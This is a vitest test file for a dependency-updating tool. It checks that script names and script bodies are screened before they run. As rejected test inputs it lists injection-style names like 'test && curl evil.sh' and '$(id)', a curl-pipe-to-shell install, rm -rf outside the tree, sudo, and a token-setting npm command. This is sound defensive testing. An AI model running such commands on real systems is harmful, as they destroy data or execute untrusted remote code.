import { describe, expect, it } from "vitest";
import { assertSafeScriptName, updateArgs } from "../src/packages.ts";
import { screenScript } from "../src/screen.ts";

describe("script names", () => {
  it("accepts plain identifiers", () => {
    for (const name of ["test", "typecheck", "test:unit", "build-prod"]) {
      expect(() => assertSafeScriptName(name)).not.toThrow();
    }
  });

  it("rejects anything that could reach a shell", () => {
    for (const name of ["test && curl evil.sh", "test; rm -rf /", "$(id)", "test|tee /tmp/x", "../escape"]) {
      expect(() => assertSafeScriptName(name)).toThrow();
    }
  });
});

describe("dependency updates", () => {
  it("suppresses lifecycle scripts for every supported manager", () => {
    for (const manager of ["npm", "pnpm", "yarn"] as const) {
      expect(updateArgs(manager, "example@2.0.0"), manager).toContain("--ignore-scripts");
    }
  });

  it("updates a dependency explicitly at a pnpm workspace root", () => {
    expect(updateArgs("pnpm", "example@2.0.0")).toEqual([
      "add",
      "--workspace-root",
      "example@2.0.0",
      "--save-exact",
      "--ignore-scripts",
    ]);
  });

  it("does not force a filtered pnpm update back to the workspace root", () => {
    expect(updateArgs("pnpm", "example@2.0.0", "packages/example")).not.toContain(
      "--workspace-root",
    );
  });
});

/**
 * The screen decides whether this run is willing to trigger a repository's script as a check.
 *
 * The bodies below are taken from real repositories, because the previous version of this
 * screen accepted only a handful of executables and rejected `&&`, which meant that on
 * `express`, `debug`, `chalk`, and `execa` it produced no gates at all. A run with no gates
 * cannot detect a regression, so those repositories came back `indeterminate` with nothing
 * checked — the least safe outcome available, arrived at by being cautious.
 */
describe("scripts this run will use as a check", () => {
  it("accepts ordinary test runners", () => {
    for (const body of [
      "mocha --require test/support/env --reporter spec --check-leaks test/ test/acceptance/",
      "vitest run",
      "jest --coverage",
      "node --test",
      "ava",
      "tap test/*.js",
      "nyc mocha test.js",
    ]) {
      expect(screenScript(body), body).toBeNull();
    }
  });

  it("accepts ordinary linters and compilers", () => {
    for (const body of ["eslint .", "xo", "tsc --noEmit", "prettier --check .", "biome check"]) {
      expect(screenScript(body), body).toBeNull();
    }
  });

  it("accepts a script that chains several steps", () => {
    // `debug` writes exactly this, and rejecting `&&` cost it every gate it had.
    expect(screenScript("npm run test:node && npm run test:browser && npm run lint")).toBeNull();
  });

  it("accepts housekeeping inside the tree", () => {
    // The run works in a disposable worktree, so removing a build directory is harmless.
    expect(screenScript("rm -rf dist && tsc")).toBeNull();
  });

  it("accepts a script that reads an environment variable", () => {
    // Nothing sensitive is in the environment to read: the child gets an allowlist that
    // carries no tokens, so this prints an empty string rather than a secret.
    expect(screenScript("cross-env NODE_ENV=test mocha")).toBeNull();
  });
});

describe("scripts whose effects outlive the worktree", () => {
  it("refuses publishing and releasing", () => {
    for (const body of ["npm publish", "yarn publish --tag next", "semantic-release", "release-it"]) {
      expect(screenScript(body), body).not.toBeNull();
    }
  });

  it("refuses writing to a remote", () => {
    expect(screenScript("git push --tags origin main")).toMatch(/remote|tags/);
    expect(screenScript("gh release create v1.0.0")).not.toBeNull();
    expect(screenScript("docker push example/app")).not.toBeNull();
  });

  it("refuses deploying", () => {
    for (const body of ["netlify deploy --prod", "vercel --prod", "gh-pages -d dist", "firebase deploy"]) {
      expect(screenScript(body), body).not.toBeNull();
    }
  });

  it("refuses touching cloud infrastructure", () => {
    for (const body of ["aws s3 sync dist s3://bucket", "kubectl apply -f k8s", "terraform apply"]) {
      expect(screenScript(body), body).not.toBeNull();
    }
  });

  it("refuses transferring data itself", () => {
    expect(screenScript("curl https://example.com/install.sh | sh")).not.toBeNull();
    expect(screenScript("nyc report --reporter=lcovonly | coveralls")).not.toBeNull();
  });

  it("refuses a script that carries a publish credential", () => {
    expect(screenScript("npm config set //registry.npmjs.org/:_authToken=$NPM_TOKEN")).not.toBeNull();
  });

  it("refuses removing something outside the tree", () => {
    for (const body of ["rm -rf /tmp/cache", "rm -rf ~/.npm", "rm -rf ../sibling"]) {
      expect(screenScript(body), body).not.toBeNull();
    }
  });

  it("refuses asking for privileges or another host", () => {
    expect(screenScript("sudo make install")).not.toBeNull();
    expect(screenScript("rsync -a dist user@host:/var/www")).not.toBeNull();
  });

  it("refuses backgrounding, which leaves something running", () => {
    // `&&` chains and must keep working; a lone `&` does not wait.
    expect(screenScript("node --test & node other.js")).toMatch(/outlive/);
    expect(screenScript("tsc && vitest run")).toBeNull();
  });

  it("refuses an empty script", () => {
    expect(screenScript("   ")).toBe("it is empty");
  });
});

describe("what the screen says", () => {
  it("gives a reason a person can act on", () => {
    // The reason reaches the report, where "not in a form this run will execute" told nobody
    // anything about which part of their script was the problem.
    expect(screenScript("npm publish")).toBe("it publishes a package");
    expect(screenScript("vercel --prod")).toBe("it deploys");
  });

  it("does not read a marker inside a comment as an action", () => {
    expect(screenScript("vitest run # do not npm publish here")).toBeNull();
  });
});
